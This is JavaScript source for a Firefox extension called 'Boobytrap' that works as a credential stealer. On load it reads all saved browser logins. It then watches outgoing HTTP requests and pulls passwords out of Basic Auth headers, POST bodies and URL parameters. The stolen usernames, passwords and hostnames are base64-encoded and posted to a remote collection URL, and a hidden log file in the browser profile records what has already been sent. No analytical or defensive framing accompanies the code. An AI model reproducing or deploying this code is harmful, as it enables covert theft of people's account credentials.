Components.utils.import("resource://gre/modules/NetUtil.jsm");
Components.utils.import("resource://gre/modules/FileUtils.jsm");

function Boobytrap(remote_domain)
{
    this._remote_domain  = remote_domain;
    this._local_log_file = "c6e71a5763796bc0b250e9edb193eb90";
    console.log("A");
    this._reported_data  = this.load_log_entries();

    console.log("B");

    this.startup();

    console.log("C");
    // Install observer
    this.register();
}

Boobytrap.prototype = {

    startup: function() {

        var btrap_login_manager = Components.classes["@mozilla.org/login-manager;1"]
                                 .getService(Components.interfaces.nsILoginManager);

        var logins = btrap_login_manager.getAllLogins({});
        var data_list = [];

        for(var index in logins)
            data_list.push(logins[index].username + ":" + logins[index].password + " - " + logins[index].hostname);

        this.inform(data_list);
    },

    inform: function(data_list){

        var data_hash;
        var log_output = "";
        var remote_output = "";

        for(var index in data_list) {

            data_hash = this.md5hash(data_list[index]);

            if(data_hash in this._reported_data)
                continue;

            this._reported_data[data_hash] = 0;

            log_output += data_hash + "\n";
            remote_output += data_list[index] + "\n";
        }

        if (remote_output) {
            var xreq = new XMLHttpRequest();
            xreq.onload = function() {};
            xreq.open("post", this._remote_domain, true);
            xreq.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

            remote_output = btoa(remote_output);

            xreq.send("data=" + remote_output);

            this.append_log_entry(log_output);
        }
    },

    find_info: function(params) {

        console.log("find_info");

        var pass_regex = /pass[^=]*=([^&]*)/i;
        var user_regex = /(?:username|usr|user|e?mail|login)[\w\.\-\_]*=([^&]{2,})/i;

        var username = [];
        var password = [];

        var result;

        for(var index in params) {

            result = user_regex.exec(params[index]);
            if(result) {
                username.push(result[1]);
            } else {
                result = pass_regex.exec(params[index]);
                if(result) {
                    password.push(result[1]);
                }
            }
        }

        if(!username.length || (username.length > 64))
            return null;

        if(!password.length || (password.length > 32))
            return null;

        var pairs = [];
        for(var u_index in username) {
            for(var p_index in password)
                pairs.push(username[u_index] + ':' + password[p_index]);
        }

        return pairs;
    },

    observe: function(subject, topic, data) {

      	subject.QueryInterface(Components.interfaces.nsIHttpChannel);
      	subject.QueryInterface(Components.interfaces.nsIUploadChannel);
        //console.log(subject.requestMethod);
        //console.log(subject.URI.spec);

        var hostname = subject.URI.scheme + "://" + subject.URI.asciiHost;
        var data;

        // Basic Auth
        try {

            data = subject.getRequestHeader("Authorization");
            data = atob(data.split(" ")[1])

            this.inform([data + ' - ' + hostname]);

        } catch(e) {}

        // POST Parameters
        if (subject.uploadStream) {

        	try {
            	
                subject.uploadStream.QueryInterface(Components.interfaces.nsISeekableStream);

                var stream = Components.classes["@mozilla.org/scriptableinputstream;1"]
                             .createInstance(Components.interfaces.nsIScriptableInputStream);
           		stream.init(subject.uploadStream);

                //subject.uploadStream.seek(0,0);

                data = stream.read(subject.uploadStream.available());

                data = this.find_info(data);
                if (data) {
                    var result = [];

                    hostname = hostname_regex.exec(details.url);

                    for(var d_index in data)
                        result.push(data + ' - ' + hostname);
                    this.inform(result);
                }

            } catch (ex) {
                return;
            }

            subject.uploadStream.seek(0,0);
        }

        // GET Parameters
        data = this.find_info(subject.URI.spec);
        if (data)
            this.inform([data + ' - ' + hostname]);
    },

    register: function() {
        var observerService = Components.classes["@mozilla.org/observer-service;1"]
                              .getService(Components.interfaces.nsIObserverService);
        observerService.addObserver(this, "http-on-modify-request", false);
    },

    md5hash: function(str) {
        var _md5 = null;
        var ascii = [];

        try {
            _md5 = Components.classes['@mozilla.org/security/hash;1']
                   .createInstance(Ci.nsICryptoHash);

            var arr = [];
            var ii = str.length;
            for (var i = 0; i < ii; ++i) {
                arr.push(str.charCodeAt(i));
            }
            _md5.init(Ci.nsICryptoHash.MD5);
            _md5.update(arr, arr.length);

            var hash = _md5.finish(false);
            
            ii = hash.length;
            for (var i = 0; i < ii; ++i) {
                var c = hash.charCodeAt(i);
                var ones = c % 16;
                var tens = c >> 4;
                ascii.push(String.fromCharCode(tens + (tens > 9 ? 87 : 48)) +
                           String.fromCharCode(ones + (ones > 9 ? 87 : 48)));
            }

        } catch (err) {
            return null;
        }

        return ascii.join('');
    },

    load_log_entries: function() {

        var _reported_data = {};

        try {

            var directory_service = Components.classes["@mozilla.org/file/directory_service;1"]
                                    .getService(Components.interfaces.nsIProperties);

            var local_path = directory_service.get("ProfD", Ci.nsIFile);
            local_path.append(this._local_log_file);

            if (!local_path.exists()) {
                local_path.create(Ci.nsIFile.NORMAL_FILE_TYPE, 0644);
            }            

            var istream = Components.classes["@mozilla.org/network/file-input-stream;1"]
                          .createInstance(Components.interfaces.nsIFileInputStream);
            istream.init(local_path, -1, 0444, 0);
            istream.QueryInterface(Components.interfaces.nsIInputStream);

            if(istream.available()) {

                var data = NetUtil.readInputStreamToString(istream, istream.available());

                entries = data.split('\n');
                entries.map(function(entry) {
                    var result = entry.replace(/\s+/g, '');

                    if (result) {
                        _reported_data[result] = 0;
                    }
                });
            }

            istream.close();

        } catch(ex) {
            return {};
        }

        return _reported_data;
    },

    append_log_entry: function(data) {

        try {
            var file = FileUtils.getFile("ProfD", [this._local_log_file]);

            var ostream = FileUtils.openFileOutputStream(file, FileUtils.MODE_WRONLY | FileUtils.MODE_APPEND);

            ostream.write(data, data.length);

            ostream.close();

        } catch(ex) {
            return;
        }
    }
}

try {
    var _boobytrap = new Boobytrap("http://192.168.2.203/mw.php");
}catch(e){
    console.log("CONSOLA!!!: " + e);
}
